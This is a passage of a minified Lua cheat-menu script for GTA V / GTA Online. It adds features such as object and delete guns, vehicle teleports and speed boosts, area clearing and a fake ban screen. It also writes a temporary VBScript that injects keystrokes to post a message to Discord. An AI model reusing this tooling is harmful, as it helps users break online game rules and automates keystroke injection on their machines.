                            graphics.start_ptfx_looped_on_entity(
                            "muz_xs_turret_flamethrower_looping_sf",
                            av["alien"],
                            v3(),
                            v3(),
                            h["flamethrower_scale"]
                        )
                    end
                else
                    if av["flamethrower_green"] ~= nil then
                        graphics.remove_particle_fx(av["flamethrower_green"], true)
                        av["flamethrower_green"] = nil
                        b1({av["alien"]})
                        av["alien"] = nil
                    end
                end
            end
            if not aO.on then
                if av["flamethrower_green"] ~= nil then
                    graphics.remove_particle_fx(av["flamethrower_green"], true)
                    av["flamethrower_green"] = nil
                    b1({av["alien"]})
                    av["alien"] = nil
                end
            end
            h["flamethrower_green"] = aO.on
            return aN(aO)
        end
    )
    V["flamethrower_green"].on = h["flamethrower_green"]
    U["shoot"] = aC("Shoot Objects", U["weapon"]).id
    V["shoot"] =
        aG(
        "Enable Object Shoot",
        U["shoot"],
        function(aO)
            if aO.on then
                for E = 1, #s do
                    if h[s[E][1]] and ped.is_ped_shooting(aX()) then
                        if #T["shooting"] > 128 then
                            b1(T["shooting"])
                            T["shooting"] = {}
                        end
                        aR(s[E][2])
                        local bc = a_()
                        local ds = cam.get_gameplay_cam_rot()
                        ds:transformRotToDir()
                        ds = ds * 8
                        bc = bc + ds
                        if streaming.is_model_an_object(s[E][2]) then
                            T["shooting"][#T["shooting"] + 1] = object.create_object(s[E][2], bc, true, false)
                        end
                        ds = nil
                        local dy = a_()
                        ds = cam.get_gameplay_cam_rot()
                        ds:transformRotToDir()
                        ds = ds * 100
                        dy = dy + ds
                        local de = dy - bc
                        entity.apply_force_to_entity(
                            T["shooting"][#T["shooting"]],
                            3,
                            de.x,
                            de.y,
                            de.z,
                            0.0,
                            0.0,
                            0.0,
                            true,
                            true
                        )
                    end
                end
            end
            if not aO.on then
                b1(T["shooting"])
                T["shooting"] = {}
            end
            h["shoot_entitys"] = aO.on
            return aN(aO)
        end
    )
    V["shoot"].on = h["shoot_entitys"]
    aF(
        "Delete Objects",
        U["shoot"],
        function()
            b1(T["shooting"])
            T["shooting"] = {}
        end
    )
    for E = 1, #s do
        V[s[E][1]] =
            aG(
            "Shoot " .. s[E][1],
            U["shoot"],
            function(aO)
                s[E][3] = aO.on
                h[s[E][1]] = aO.on
            end
        )
        V[s[E][1]].on = h[s[E][1]]
    end
    V["delete_gun"] =
        aG(
        "Delete Gun",
        U["weapon"],
        function(aO)
            if aO.on then
                if ped.is_ped_shooting(aX()) then
                    local dz = player.get_entity_player_is_aiming_at(aV())
                    if dz ~= nil then
                        b1({dz})
                    end
                end
            end
            h["delete_gun"] = aO.on
            return aN(aO)
        end
    )
    V["delete_gun"].on = h["delete_gun"]
    U["model_gun"] = aC("Model Gun", U["weapon"]).id
    V["model_gun"] =
        aG(
        "Standard Model Gun (PEDs)",
        U["model_gun"],
        function(aO)
            if aO.on then
                if as then
                    entity.set_entity_visible(aX(), false)
                    if ar ~= nil then
                        entity.set_entity_visible(ar, true)
                    end
                else
                    entity.set_entity_visible(aX(), true)
                end
                if player.is_player_free_aiming(aV()) then
                    local dA = player.get_entity_player_is_aiming_at(aV())
                    if dA ~= 0 then
                        dA = entity.get_entity_model_hash(dA)
                        if streaming.is_model_a_ped(dA) then
                            if ar ~= nil then
                                b1({ar})
                                ar = nil
                            end
                            local dB = entity.get_entity_model_hash(aX())
                            if dA ~= dB then
                                as = false
                                system.wait(50)
                                local dC = ped.get_current_ped_weapon(aX())
                                bm(dA, nil, nil, nil, true)
                                system.yield(25)
                                weapon.give_delayed_weapon_to_ped(aX(), dC, 0, 1)
                            end
                        elseif streaming.is_model_a_vehicle(dA) and V["model_gun_ext"].on then
                            b1({ar})
                            ar = nil
                            as = true
                            ar = vehicle.create_vehicle(dA, a_(), 0, true, false)
                            entity.attach_entity_to_entity(ar, aX(), 0, v3(), v3(), true, true, false, 0, true)
                        elseif streaming.is_model_an_object(dA) and V["model_gun_ext"].on then
                            b1({ar})
                            ar = nil
                            aR(dA)
                            ar = object.create_object(dA, a_(), true, false)
                            aT(dA)
                            as = true
                            entity.attach_entity_to_entity(ar, aX(), 0, v3(), v3(), true, true, false, 0, true)
                        end
                    end
                end
            end
            if not aO.on then
                b1({ar})
                ar = nil
                entity.set_entity_visible(aX(), true)
            end
            h["model_gun"] = aO.on
            return aN(aO)
        end
    )
    V["model_gun"].on = h["model_gun"]
    V["model_gun_ext"] =
        aG(
        "Add Objects and Vehicles to Model Gun",
        U["model_gun"],
        function(aO)
            h["model_gun_ext"] = aO.on
        end
    )
    V["model_gun_ext"].on = h["model_gun_ext"]
    V["teleport_high_in_air"] =
        aF(
        "Teleport High in Air",
        U["misc"],
        function()
            local bc = a_()
            while bc.z < 25000 do
                bc.z = bc.z + 500
                b9(bc)
                system.yield(50)
            end
        end
    )
    U["vehicle"] = aC("Vehicle", U["misc"]).id
    V["tp_own_veh_to_me"] =
        aF(
        "Teleport Own Vehicle to me",
        U["vehicle"],
        function()
            local bd = player.get_personal_vehicle()
            local dD = ped.get_vehicle_ped_is_using(aX())
            if bd ~= 0 and dD ~= bd then
                b0(bd, bP(a_(), aY(), 5))
                entity.set_entity_heading(bd, aY())
            end
        end
    )
    V["tp_own_veh_to_me_drive"] =
        aF(
        "Teleport Own Vehicle to me and drive",
        U["vehicle"],
        function()
            local bd = player.get_personal_vehicle()
            local dD = ped.get_vehicle_ped_is_using(aX())
            if bd ~= 0 and dD ~= bd then
                b0(bd, a_())
                entity.set_entity_heading(bd, aY())
                ped.set_ped_into_vehicle(aX(), bd, -1)
            end
        end
    )
    V["drive_own_veh"] =
        aF(
        "Drive Own Vehicle",
        U["vehicle"],
        function()
            local bd = player.get_personal_vehicle()
            local dD = ped.get_vehicle_ped_is_using(aX())
            if bd ~= 0 and dD ~= bd then
                ped.set_ped_into_vehicle(aX(), bd, -1)
            end
        end
    )
    V["tp_to_own_veh"] =
        aF(
        "Teleport to Own Vehicle",
        U["vehicle"],
        function()
            local bd = player.get_personal_vehicle()
            local dD = ped.get_vehicle_ped_is_using(aX())
            if bd ~= 0 and dD ~= bd then
                b9(bP(aZ(bd), entity.get_entity_heading(bd), -5), 0, entity.get_entity_heading(bd))
            end
        end
    )
    U["vehicle_colors"] = aC("Vehicle Colors", U["vehicle"]).id
    V["light_speed"] =
        aH(
        "Set Speed in Milliseconds",
        "autoaction_value_i",
        U["vehicle_colors"],
        function(aO)
            h["veh_lights_speed"] = aO.value_i
        end
    )
    V["light_speed"].min_i = 25
    V["light_speed"].max_i = 2500
    V["light_speed"].mod_i = 25
    V["light_speed"].value_i = h["veh_lights_speed"]
    U["random_col"] = aC("Random Colors", U["vehicle_colors"]).id
    V["random_primary"] =
        aG(
        "Random Primary",
        U["random_col"],
        function(aO)
            if aO.on then
                c0(a2)
                c0({"rainbow_primary"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    aP(bd)
                    vehicle.set_vehicle_custom_primary_colour(bd, math.random(0, 0xffffff))
                    system.wait(V["light_speed"].value_i)
                end
            end
            h["random_primary"] = aO.on
            return aN(aO)
        end
    )
    V["random_primary"].on = h["random_primary"]
    V["random_secondary"] =
        aG(
        "Random Secondary",
        U["random_col"],
        function(aO)
            if aO.on then
                c0(a2)
                c0({"rainbow_secondary"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    aP(bd)
                    vehicle.set_vehicle_custom_secondary_colour(bd, math.random(0, 0xffffff))
                    system.wait(V["light_speed"].value_i)
                end
            end
            h["random_secondary"] = aO.on
            return aN(aO)
        end
    )
    V["random_secondary"].on = h["random_secondary"]
    V["random_pearlescent"] =
        aG(
        "Random Pearlescent",
        U["random_col"],
        function(aO)
            if aO.on then
                c0(a2)
                c0({"rainbow_pearlescent"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    aP(bd)
                    vehicle.set_vehicle_custom_pearlescent_colour(bd, math.random(0, 0xffffff))
                    system.wait(V["light_speed"].value_i)
                end
            end
            h["random_pearlescent"] = aO.on
            return aN(aO)
        end
    )
    V["random_pearlescent"].on = h["random_pearlescent"]
    V["random_neon"] =
        aG(
        "Random Neon Lights",
        U["random_col"],
        function(aO)
            if aO.on then
                c0(a2)
                c0({"rainbow_neon"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    aP(bd)
                    local d7 = math.random(0, 0xffffff)
                    vehicle.set_vehicle_neon_lights_color(bd, d7)
                    system.wait(V["light_speed"].value_i)
                end
            end
            h["random_neon"] = aO.on
            return aN(aO)
        end
    )
    V["random_neon"].on = h["random_neon"]
    V["random_smoke"] =
        aG(
        "Random Smoke",
        U["random_col"],
        function(aO)
            if aO.on then
                c0(a2)
                c0({"rainbow_smoke"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    aP(bd)
                    local dE = math.random(0, 255)
                    local dF = math.random(0, 255)
                    local dG = math.random(0, 255)
                    vehicle.set_vehicle_tire_smoke_color(bd, dE, dF, dG)
                    system.wait(V["light_speed"].value_i)
                end
            end
            h["random_smoke"] = aO.on
            return aN(aO)
        end
    )
    V["random_smoke"].on = h["random_smoke"]
    V["random_xenon"] =
        aG(
        "Random Xenon",
        U["random_col"],
        function(aO)
            if aO.on then
                if menu.get_version() ~= "2.4.2" then
                    c0(a2)
                    c0({"rainbow_xenon"})
                    local bd = ped.get_vehicle_ped_is_using(aX())
                    if bd ~= 0 then
                        aP(bd)
                        vehicle.set_vehicle_headlight_color(bd, math.random(0, 12))
                        system.wait(V["light_speed"].value_i)
                    end
                end
            end
            h["random_xenon"] = aO.on
            return aN(aO)
        end
    )
    V["random_xenon"].on = h["random_xenon"]
    U["rainbow_col"] = aC("Rainbow Colors", U["vehicle_colors"]).id
    V["rainbow_primary"] =
        aG(
        "Rainbow Primary",
        U["rainbow_col"],
        function(aO)
            if aO.on then
                c0(a2)
                c0({"random_primary"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    aP(bd)
                    for E = 1, #t do
                        vehicle.set_vehicle_custom_primary_colour(bd, bS({t[E][1], t[E][2], t[E][3]}))
                        system.wait(V["light_speed"].value_i)
                    end
                end
            end
            h["rainbow_primary"] = aO.on
            return aN(aO)
        end
    )
    V["rainbow_primary"].on = h["rainbow_primary"]
    V["rainbow_secondary"] =
        aG(
        "Rainbow Secondary",
        U["rainbow_col"],
        function(aO)
            if aO.on then
                c0(a2)
                c0({"random_secondary"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    aP(bd)
                    for E = 1, #t do
                        vehicle.set_vehicle_custom_secondary_colour(bd, bS({t[E][1], t[E][2], t[E][3]}))
                        system.wait(V["light_speed"].value_i)
                    end
                end
            end
            h["rainbow_secondary"] = aO.on
            return aN(aO)
        end
    )
    V["rainbow_secondary"].on = h["rainbow_secondary"]
    V["rainbow_pearlescent"] =
        aG(
        "Rainbow Pearlescent",
        U["rainbow_col"],
        function(aO)
            if aO.on then
                c0(a2)
                c0({"random_pearlescent"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    aP(bd)
                    for E = 1, #t do
                        vehicle.set_vehicle_custom_pearlescent_colour(bd, bS({t[E][1], t[E][2], t[E][3]}))
                        system.wait(V["light_speed"].value_i)
                    end
                end
            end
            h["rainbow_pearlescent"] = aO.on
            return aN(aO)
        end
    )
    V["rainbow_pearlescent"].on = h["rainbow_pearlescent"]
    V["rainbow_neon"] =
        aG(
        "Rainbow Neon Lights",
        U["rainbow_col"],
        function(aO)
            if aO.on then
                c0(a2)
                c0({"random_neon"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    aP(bd)
                    for E = 1, #t do
                        vehicle.set_vehicle_neon_lights_color(bd, bS({t[E][1], t[E][2], t[E][3]}))
                        system.wait(V["light_speed"].value_i)
                    end
                end
            end
            h["rainbow_neon"] = aO.on
            return aN(aO)
        end
    )
    V["rainbow_neon"].on = h["rainbow_neon"]
    V["rainbow_smoke"] =
        aG(
        "Rainbow Smoke",
        U["rainbow_col"],
        function(aO)
            if aO.on then
                c0(a2)
                c0({"random_smoke"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    aP(bd)
                    for E = 1, #t do
                        local m = t[E]
                        vehicle.set_vehicle_tire_smoke_color(bd, m[1], m[2], m[3])
                        system.wait(V["light_speed"].value_i)
                    end
                end
            end
            h["rainbow_smoke"] = aO.on
            return aN(aO)
        end
    )
    V["rainbow_smoke"].on = h["rainbow_smoke"]
    V["rainbow_xenon"] =
        aG(
        "Rainbow Xenon",
        U["rainbow_col"],
        function(aO)
            if aO.on then
                if menu.get_version() ~= "2.4.2" then
                    c0(a2)
                    c0({"random_xenon"})
                    local bd = ped.get_vehicle_ped_is_using(aX())
                    if bd ~= 0 then
                        aP(bd)
                        for E = 0, 12 do
                            vehicle.set_vehicle_headlight_color(bd, E)
                            system.wait(V["light_speed"].value_i)
                        end
                    end
                end
            end
            h["rainbow_xenon"] = aO.on
            return aN(aO)
        end
    )
    V["rainbow_xenon"].on = h["rainbow_xenon"]
    V["synced_random"] =
        aG(
        "Synced Random Colors",
        U["vehicle_colors"],
        function(aO)
            if aO.on then
                c0(a1)
                c0(a0)
                c0({"synced_rainbow_smooth", "synced_rainbow"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    c2(bd, {math.random(0, 255), math.random(0, 255), math.random(0, 255)})
                    system.wait(V["light_speed"].value_i)
                end
            end
            h["synced_random"] = aO.on
            return aN(aO)
        end
    )
    V["synced_random"].on = h["synced_random"]
    V["synced_rainbow"] =
        aG(
        "Synced Rainbow Colors",
        U["vehicle_colors"],
        function(aO)
            if aO.on then
                c0(a1)
                c0(a0)
                c0({"synced_random", "synced_rainbow_smooth"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    for E = 1, #t do
                        local m = t[E]
                        c2(bd, {m[1], m[2], m[3]}, E)
                        system.wait(V["light_speed"].value_i)
                    end
                end
            end
            h["synced_rainbow"] = aO.on
            return aN(aO)
        end
    )
    V["synced_rainbow"].on = h["synced_rainbow"]
    V["synced_rainbow_smooth"] =
        aG(
        "Synced Smooth Rainbow",
        U["vehicle_colors"],
        function(aO)
            if aO.on then
                c0(a1)
                c0(a0)
                c0({"synced_random", "synced_rainbow"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    local dH
                    dH = math.floor((101 - V["light_speed"].value_i / 25) / 2)
                    if dH < 1 then
                        dH = 1
                    end
                    for E = 0, 255, dH do
                        c2(bd, {255, E, 0})
                    end
                    dH = math.floor((101 - V["light_speed"].value_i / 25) / 2)
                    if dH < 1 then
                        dH = 1
                    end
                    for E = 255, 0, -dH do
                        c2(bd, {E, 255, 0})
                    end
                    dH = math.floor((101 - V["light_speed"].value_i / 25) / 2)
                    if dH < 1 then
                        dH = 1
                    end
                    for E = 0, 255, dH do
                        c2(bd, {0, 255, E})
                    end
                    dH = math.floor((101 - V["light_speed"].value_i / 25) / 2)
                    if dH < 1 then
                        dH = 1
                    end
                    for E = 255, 0, -dH do
                        c2(bd, {0, E, 255})
                    end
                    dH = math.floor((101 - V["light_speed"].value_i / 25) / 2)
                    if dH < 1 then
                        dH = 1
                    end
                    for E = 0, 255, dH do
                        c2(bd, {E, 0, 255})
                    end
                    dH = math.floor((101 - V["light_speed"].value_i / 25) / 2)
                    if dH < 1 then
                        dH = 1
                    end
                    for E = 255, 0, -dH do
                        c2(bd, {255, 0, E})
                    end
                end
            end
            h["synced_rainbow_smooth"] = aO.on
            return aN(aO)
        end
    )
    V["synced_rainbow_smooth"].on = h["synced_rainbow_smooth"]
    aF(
        "100% Black",
        U["vehicle_colors"],
        function()
            local bd = ped.get_vehicle_ped_is_using(aX())
            if bd ~= 0 then
                c2(bd, {0, 0, 0}, 0)
            else
                k("Get in a valid Vehicle!", 173)
            end
        end
    )
    V["black_100"] =
        aG(
        "100% Black",
        U["vehicle_colors"],
        function(aO)
            if aO.on then
                c0(a1)
                c0(a0)
                c0(a2)
                c0({"fade_black_red"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    c2(bd, {0, 0, 0}, 0)
                end
            end
            h["black_100"] = aO.on
            return aN(aO)
        end
    )
    V["black_100"].on = h["black_100"]
    V["fade_black_red"] =
        aG(
        "Fade Black-Red",
        U["vehicle_colors"],
        function(aO)
            if aO.on then
                c0(a1)
                c0(a0)
                c0(a2)
                c0({"black_100"})
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    local dH
                    dH = math.floor((101 - V["light_speed"].value_i / 25) / 2)
                    if dH < 1 then
                        dH = 1
                    end
                    for E = 0, 255, dH do
                        c2(bd, {E, 0, 0}, 0, 8)
                    end
                    dH = math.floor((101 - V["light_speed"].value_i / 25) / 2)
                    if dH < 1 then
                        dH = 1
                    end
                    for E = 255, 0, -dH do
                        c2(bd, {E, 0, 0}, 0, 8)
                    end
                end
            end
            h["fade_black_red"] = aO.on
            return aN(aO)
        end
    )
    V["fade_black_red"].on = h["fade_black_red"]
    V["heli"] =
        aH(
        "Heli Blades Speed 0-100%",
        "value_i",
        U["vehicle"],
        function(aO)
            h["heli"] = aO.on
            h["heli_i"] = V["heli"].value_i
            local bd = ped.get_vehicle_ped_is_using(aX())
            if aO.on then
                if bd ~= 0 then
                    aP(bd)
                    local cK = aO.value_i / 100
                    vehicle.set_heli_blades_speed(bd, cK)
                end
            end
            return aN(aO)
        end
    )
    V["heli"].max_i = 100
    V["heli"].min_i = 0
    V["heli"].mod_i = 5
    V["heli"].value_i = h["heli_i"]
    V["heli"].on = h["heli"]
    V["sel_boost_speed"] =
        aH(
        "Boost Vehicle",
        "value_i",
        U["vehicle"],
        function(aO)
            h["sel_boost_speed"] = aO.on
            h["sel_boost_speed_speed"] = V["sel_boost_speed"].value_i
            local bd = ped.get_vehicle_ped_is_using(aX())
            if aO.on then
                if bd ~= 0 then
                    aP(bd)
                    entity.set_entity_max_speed(bd, V["sel_boost_speed"].value_i)
                    vehicle.set_vehicle_forward_speed(bd, V["sel_boost_speed"].value_i)
                end
            end
            if not aO.on then
                entity.set_entity_max_speed(bd, 540)
            end
            return aN(aO)
        end
    )
    V["sel_boost_speed"].max_i = 50000
    V["sel_boost_speed"].min_i = 0
    V["sel_boost_speed"].mod_i = 50
    V["sel_boost_speed"].value_i = h["sel_boost_speed_speed"]
    V["sel_boost_speed"].on = h["sel_boost_speed"]
    V["speedometer"] =
        aH(
        "License Plate Speedometer",
        "value_i",
        U["vehicle"],
        function(aO)
            h["speedometer"] = aO.on
            h["speedometer_type"] = V["speedometer"].value_i
            af = V["speedometer"].value_i
            if aO.on then
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    if af ~= ag then
                        k("Displaying Speed now with Unit:\n" .. N[V["speedometer"].value_i][3], 96)
                    end
                    local dI = entity.get_entity_speed(bd) * N[V["speedometer"].value_i][2]
                    if dI < 10 and dI > 0.01 then
                        dI = string.format("%.2f", dI)
                    elseif dI >= 10 and dI < 100 then
                        dI = string.format("%.1f", dI)
                    elseif dI < 0.01 and V["speedometer"].value_i == 7 then
                        dI = string.format("%.5f", dI)
                    else
                        dI = math.floor(dI)
                    end
                    vehicle.set_vehicle_number_plate_text(bd, tostring(dI) .. N[V["speedometer"].value_i][1])
                end
            end
            ag = V["speedometer"].value_i
            return aN(aO)
        end
    )
    V["speedometer"].max_i = #N
    V["speedometer"].min_i = 1
    V["speedometer"].value_i = h["speedometer_type"]
    V["speedometer"].on = h["speedometer"]
    V["drive_on_ocean"] =
        aG(
        "Drive / Walk on the Ocean",
        U["misc"],
        function(aO)
            if aO.on then
                local bc = a_()
                if am == nil then
                    aR(1822550295)
                    am = object.create_object(1822550295, v3(bc.x, bc.y, -4), true, false)
                    entity.set_entity_visible(am, false)
                end
                water.set_waves_intensity(-100000000)
                bc.z = -4
                b0(am, bc)
            end
            h["drive_on_ocean"] = aO.on
            if not aO.on and am ~= nil then
                water.reset_waves_intensity()
                b1({am})
                am = nil
            end
            return aN(aO)
        end
    )
    V["drive_on_ocean"].on = h["drive_on_ocean"]
    V["drive_this_height"] =
        aG(
        "Drive / Walk this Height",
        U["misc"],
        function(aO)
            if aO.on then
                local bc, ca
                if ped.is_ped_in_any_vehicle(aX()) then
                    local bd = ped.get_vehicle_ped_is_using(aX())
                    bc = aZ(bd)
                    ca = 5.25
                else
                    bc = a_()
                    ca = 5.85
                end
                if an == nil then
                    aR(1822550295)
                    ao = bc.z - ca
                    an = object.create_object(1822550295, v3(bc.x, bc.y, ao), true, false)
                    entity.set_entity_visible(an, false)
                end
                water.set_waves_intensity(-100000000)
                bc.z = ao
                b0(an, bc)
            end
            h["drive_this_height"] = aO.on
            if not aO.on and an ~= nil then
                water.reset_waves_intensity()
                b1({an})
                an = nil
                ao = nil
            end
            return aN(aO)
        end
    )
    V["drive_this_height"].on = h["drive_this_height"]
    V["weird_ent"] =
        aG(
        "Weird Entity",
        U["misc"],
        function(aO)
            local bd = ped.get_vehicle_ped_is_using(aX())
            local dJ = aX()
            if aO.on then
                if bd ~= 0 and ap == nil then
                    local cb = entity.get_entity_model_hash(bd)
                    ap = vehicle.create_vehicle(cb, a_(), 0, true, false)
                    dJ = bd
                elseif ap == nil then
                    ap = ped.clone_ped(aX())
                end
                entity.set_entity_visible(dJ, false)
                entity.set_entity_collision(ap, false, false, false)
                entity.set_entity_rotation(
                    ap,
                    v3(math.random(-180, 180), math.random(-180, 180), math.random(-180, 180))
                )
                b0(ap, a_())
            end
            if not aO.on then
                b1({ap})
                ap = nil
                entity.set_entity_visible(dJ, true)
            end
            h["weird_ent"] = aO.on
            return aN(aO)
        end
    )
    V["weird_ent"].on = h["weird_ent"]
    V["real_time"] =
        aG(
        "Real Time (Clientside)",
        U["misc"],
        function(aO)
            if aO.on then
                local l = os.date("*t")
                time.set_clock_time(l.hour, l.min, l.sec)
                gameplay.clear_cloud_hat()
            end
            h["real_time"] = aO.on
            return aN(aO)
        end
    )
    V["real_time"].on = h["real_time"]
    V["random_clothes"] =
        aG(
        "Random Clothes",
        U["misc"],
        function(aO)
            if aO.on then
                system.yield(333)
                ped.set_ped_random_component_variation(aX())
            end
            h["random_clothes"] = aO.on
            return aN(aO)
        end
    )
    V["random_clothes"].on = h["random_clothes"]
    V["clear_area"] =
        aG(
        "Gameplay Clear Area",
        U["misc"],
        function(aO)
            if aO.on then
                local bc = a_()
                gameplay.clear_area_of_cops(bc, 10000, true)
                gameplay.clear_area_of_peds(bc, 10000, true)
                gameplay.clear_area_of_vehicles(bc, 10000, false, false, false, false, false)
                gameplay.clear_area_of_objects(bc, 10000, 0)
                gameplay.clear_area_of_objects(bc, 10000, 1)
                gameplay.clear_area_of_objects(bc, 10000, 2)
                gameplay.clear_area_of_objects(bc, 10000, 6)
                gameplay.clear_area_of_objects(bc, 10000, 16)
                gameplay.clear_area_of_objects(bc, 10000, 17)
            end
            h["clear_area"] = aO.on
            return aN(aO)
        end
    )
    V["clear_area"].on = h["clear_area"]
    V["auto_tp_wp"] =
        aG(
        "Auto Teleport to Waypoint",
        U["misc"],
        function(aO)
            if aO.on then
                local cM = ui.get_waypoint_coord()
                if cM.x ~= 16000 then
                    local bc = a_()
                    local dK = v2()
                    dK.x = bc.x
                    dK.y = bc.y
                    if b3(cM, dK) > 35 then
                        k("Detected Waypoint, teleporting...", 172)
                        local dL = aX()
                        local bC = ped.get_vehicle_ped_is_using(dL)
                        if bC ~= 0 then
                            dL = bC
                        end
                        local dM = 850
                        local dw, dN = gameplay.get_ground_z(v3(cM.x, cM.y, dM))
                        while not dw do
                            dM = dM - 5
                            dw, dN = gameplay.get_ground_z(v3(cM.x, cM.y, dM))
                            if dM < -200 then
                                dM = -200
                                dw = true
                            end
                        end
                        b9(v3(cM.x, cM.y, dN))
                    end
                end
            end
            h["auto_tp_wp"] = aO.on
            return aN(aO)
        end
    )
    V["auto_tp_wp"].on = h["auto_tp_wp"]
    V["police_outfit"] =
        aG(
        "Force Police Outfit",
        U["misc"],
        function(aO)
            if aO.on then
                local dO = Z
                local dP = _
                if player.is_player_female(aV()) then
                    dO = X
                    dP = Y
                end
                for E = 1, #dO do
                    ped.set_ped_component_variation(aX(), E, dO[E][2], dO[E][1], 2)
                end
                for E = 1, #dP do
                    ped.set_ped_prop_index(aX(), dP[E][1], dP[E][2], dP[E][3], 0)
                end
                system.wait(250)
            end
            h["police_outfit"] = aO.on
            return aN(aO)
        end
    )
    V["police_outfit"].on = h["police_outfit"]
    V["ban_screen"] =
        aG(
        "You've Been Banned",
        U["misc"],
        function(aO)
            if aO.on then
                local bc = v2()
                local db = v2()
                local dQ = v2()
                bc.x = 0.5
                bc.y = 0.325
                db.x = 0.5
                db.y = 0.5
                dQ.x = 0.5
                dQ.y = 0.54
                ui.set_text_scale(3.0)
                ui.set_text_font(7)
                ui.set_text_centre(0)
                ui.set_text_color(255, 206, 67, 255)
                ui.set_text_outline(true)
                ui.draw_text("alert", bc)
                ui.set_text_scale(0.5)
                ui.set_text_centre(0)
                ui.set_text_color(255, 255, 255, 255)
                ui.draw_text("You have been banned from Grand Theft Auto Online permanently", db)
                ui.set_text_scale(0.5)
                ui.set_text_centre(0)
                ui.draw_text("Return to Grand Theft Auto V", dQ)
                ui.draw_rect(.5, .5, 1, 1, 0, 0, 0, 255)
                ui.draw_rect(.5, .492, .52, .0019, 255, 255, 255, 255)
                ui.draw_rect(.5, .585, .52, .0019, 255, 255, 255, 255)
            end
            return aN(aO)
        end
    )
    V["swap_seats"] =
        aH(
        "Swap Vehicle Seat",
        "autoaction_value_i",
        U["misc"],
        function()
            local bC = ped.get_vehicle_ped_is_using(aX())
            if bC ~= 0 then
                ped.set_ped_into_vehicle(aX(), bC, V["swap_seats"].value_i)
            end
        end
    )
    V["swap_seats"].min_i = -1
    V["swap_seats"].value_i = -1
    V["swap_seats"].max_i = 15
    U["utils"] = aC("Utils", U["misc"]).id
    V["auto_load"] =
        aG(
        "autoexec Scripts from folder 'autoload'",
        U["utils"],
        function(aO)
            h["auto_load"] = aO.on
            if aO.on then
                if utils.dir_exists(os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\autoload") then
                    local dR =
                        utils.get_all_files_in_directory(
                        os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\autoload",
                        "lua"
                    )
                    if dR ~= nil then
                        n("Found Scripts for autoexecuting!")
                        for E = 1, #dR do
                            n(dR[E])
                            local dS = string.sub(dR[E], 1, -5)
                            system.wait(5000)
                            if not require("\\autoload\\" .. dS) then
                                k("ERROR Loading Script " .. dR[E] .. "!", 208)
                            else
                                k("Loaded Script " .. dR[E] .. " succesfully!", 166)
                                n("Loaded Script " .. dR[E] .. " succesfully!")
                            end
                        end
                    end
                else
                    k("No folder 'autoload' found, create a folder and place any script inside!", 174)
                end
            end
        end
    )
    V["auto_load"].on = h["auto_load"]
    V["leave_session"] =
        aF(
        "Leave-Session",
        U["utils"],
        function()
            local time = utils.time_ms() + 8500
            while time > utils.time_ms() do
            end
        end
    )
    V["crash_yourself"] =
        aF(
        "Crash Yourself",
        U["utils"],
        function()
            os.execute("taskkill /F /IM GTA5.exe")
            while 1 do
            end
        end
    )
    aG(
        "Auto-Hostkick-Yourself",
        U["utils"],
        function(aO)
            if aO.on then
                if network.network_is_host() then
                    k("Hostkicking-Yourself!")
                    n("Hostkicking-Yourself!")
                    network.network_session_kick_player(aV())
                end
            end
            return aN(aO)
        end
    )
    aF(
        "Fuck You",
        U["utils"],
        function()
            os.execute(
                "start https://steamuserimages-a.akamaihd.net/ugc/849342240392626653/882456A11C32E6548619159DCEE8BA0D1DDAEE35/?imw=1024&imh=1024&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true"
            )
        end
    )
    V["send_message_to_dc"] =
        aF(
        "Send Message to #general",
        U["utils"],
        function()
            k("It will take 8 seconds to sent the message, calm down and wait :)")
            local aQ, co = input.get("Enter Message", "", 128, 0)
            while aQ == 1 do
                system.wait(0)
                aQ, co = input.get("Enter Message", "", 128, 0)
            end
            if aQ == 2 then
                return HANDLER_POP
            end
            co = co .. "\n\n*this message was sent by 2Take1Script*"
            utils.to_clipboard(co)
            os.execute("start https://discord.com/channels/570999086874886154/570999091320979486")
            system.wait(8000)
            local dT = "C:\\TEMP\\XX2T1SXX.vbs"
            local dU = io.open(dT, "a")
            io.output(dU)
            io.write('set sendmsg = wscript.createobject("wscript.shell")\nwscript.sleep(1000)\n')
            io.write('sendmsg.sendkeys "^v"\nwscript.sleep(50)\n')
            io.write('sendmsg.sendkeys "{ENTER}"\nwscript.sleep(500)\n')
            io.write("wscript.quit")
            io.close(dU)
            os.execute("start " .. dT)
            system.wait(1000)
            os.remove(dT)
        end
    )
    U["ipl_config"] =
        aC(
        "IPL-Loader",
        U["misc"],
        function()
            if not utils.file_exists(a .. "\\2Take1IPLlist.txt") then
                k("No IPL-List File found.")
                k(
                    "Download '2Take1IPLlist.txt' from #lua-script-share and place it in '2Take1Menu/scripts/2Take1Script/' folder."
                )
                al["load_ipls"].hidden = true
                al["range_start"].hidden = true
                al["range_end"].hidden = true
                al["remove_ipls"].hidden = true
            else
                al["load_ipls"].hidden = false
                al["range_start"].hidden = false
                al["range_end"].hidden = false
                al["remove_ipls"].hidden = false
            end
        end
    ).id
    al["load_ipls"] =
        aF(
        "Load ALL IPLs from File",
        U["ipl_config"],
        function()
            for dV in io.lines(a .. "\\2Take1IPLlist.txt") do
                streaming.request_ipl(dV)
            end
        end
    )
    al["range_start"] =
        aH(
        "Select starting line for range",
        "action_value_i",
        U["ipl_config"],
